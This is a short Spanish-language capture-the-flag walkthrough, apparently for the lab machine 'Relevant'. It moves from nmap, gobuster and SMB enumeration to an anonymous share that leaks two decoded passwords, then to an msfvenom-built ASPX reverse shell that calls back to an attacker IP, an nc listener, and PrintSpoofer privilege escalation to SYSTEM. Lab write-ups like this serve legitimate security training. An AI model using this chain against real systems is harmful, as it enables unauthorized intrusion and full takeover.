# Relevant

## Nmap

![alt text](image.png)
![alt text](image-1.png)

### Nmap SMB
![alt text](image-5.png)

## Threader3000 
Permite ver los puertos abiertos

    threader3000

![alt text](image-10.png)

## Fuzzing

    gobuster dir -u http://10.10.48.117 -w Desktop/common.txt -x php 

![alt text](image-2.png)

## Enum4linux

![alt text](image-4.png)

## SMB

    smbmap -H 10.10.48.117

![alt text](image-3.png)

    smbclient -L 10.10.48.117

![alt text](image-6.png)

Entramos en el usuario y descargamos el archivo ``passwords.txt``

    smbclient //10.10.48.117/nt4wrksv -N

![alt text](image-7.png)

Contenido del archivo

![alt text](image-8.png)

Decodificamos usando CyberChef
![alt text](image-9.png)

    Bob - !P@$$W0rD!123
    Bill - Juw4nnaM4n420696969!$$$

Tenemos acceso web al archivo subido en SMB
![alt text](image-11.png)

Creamos una aspx reverse shell, para subirla el servidor

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.67.209 LPORT=53 -f aspx -o pwn.aspx

![alt text](image-12.png)

Subimos el archivo

![alt text](image-13.png)

Nos conectamos a la reverse shell

    curl http://10.10.179.154:49663/nt4wrksv/pwn.aspx

    nc -nvlp 53

![alt text](image-15.png)
![alt text](image-14.png)

Buscamos el archivo ``user.txt``

![alt text](image-16.png)

Vemos nuestros privilegios
![alt text](image-17.png)

Encontramos ``SeImpersonatePrivilege``, existe un exploit que nos permite explotar esta vulnerabilidad

Clonamos el siguiente repostirio

    git cone https://github.com/dievus/printspoofer.git

Subimos el ``.exe`` al servidor samba
![alt text](image-18.png)

Lo ejecutamos y ya seremos ``nt authority\system``
![alt text](image-19.png)

